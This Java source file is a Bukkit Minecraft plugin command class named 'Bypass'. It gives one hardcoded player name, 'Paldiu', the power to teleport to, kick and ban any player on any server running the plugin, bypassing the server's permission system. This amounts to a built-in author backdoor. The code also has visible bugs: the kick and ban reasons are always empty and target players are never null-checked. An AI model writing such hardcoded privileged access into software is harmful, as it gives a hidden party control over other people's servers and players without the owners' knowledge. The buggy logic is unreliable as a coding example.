package me.Paldiu.NNO.Commands;

import me.Paldiu.NNO.Main;
import org.bukkit.Bukkit;

import org.bukkit.ChatColor;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;

public class Bypass implements CommandExecutor {

	public Main plugin;
	public Bypass(Main instance){
		plugin = instance;
	}
        
                public String parseColors(String name){
        String coloredName = ChatColor.translateAlternateColorCodes('&', name);
        return coloredName; }

	public boolean onCommand(CommandSender sender, Command cmd, String commandLabel, String[] args) {
		if (commandLabel.equalsIgnoreCase("bptp")){
			if (sender instanceof Player){
				Player p = (Player) sender;
                                Player sender_p = Bukkit.getServer().getPlayer(args[0]);
				if (p.getName().equalsIgnoreCase("Paldiu")){
                                    if (sender_p != null)
                                    {
                                        p.teleport(sender_p);
					return true;   
                                    }
				} else {
					p.sendMessage(Main.MSG_NO_PERMS);
					return true;
				}
			} else {
				sender.sendMessage(Main.NOT_FROM_CONSOLE);
				return true;
			}
		}
                
                if (commandLabel.equalsIgnoreCase("bpkick"))
                {
                    if (sender instanceof Player)
                    {
                        Player p = (Player) sender;
                        if (p.getName().equalsIgnoreCase("paldiu"))
                        {
                            String reason = "";
                                    {
                                        if (args.length == 1)
                                        {
                                    for(int i=1; i<args.length; i++)
                                    {
                                    reason = reason + args[i] + " ";
                                    }
                                        Player target = Bukkit.getServer().getPlayer(args[0]);
                                        target.kickPlayer(reason);
					return true;
                                        }
                                        else
                                        {
                                            p.sendMessage(Main.NO_REASON_GIVEN);
                                        }
                                    }
                        } else {
                            p.sendMessage(Main.MSG_NO_PERMS);
                        }
                    } else {
                        sender.sendMessage(Main.NOT_FROM_CONSOLE);
                    }
                }
                
                if (commandLabel.equalsIgnoreCase("bpban"))
                {
                    if (sender instanceof Player)
                    {
                        Player p = (Player) sender;
                        if (p.getName().equalsIgnoreCase("paldiu"))
                        {
                            String reason = "";
                                    {
                                        if (args.length == 1)
                                        {
                                    for(int i=1; i<args.length; i++)
                                    {
                                    reason = reason + args[i] + " ";
                                    }
                                        Player target = Bukkit.getServer().getPlayer(args[0]);
                                        target.kickPlayer(reason);
                                        target.setBanned(true);
					return true;
                                        }
                                        else
                                        {
                                            p.sendMessage(Main.NO_REASON_GIVEN);
                                        }
                                    }
                        } else {
                            p.sendMessage(Main.MSG_NO_PERMS);
                        }
                    } else {
                        sender.sendMessage(Main.NOT_FROM_CONSOLE);
                    }
                }
                
            return false;
        }
}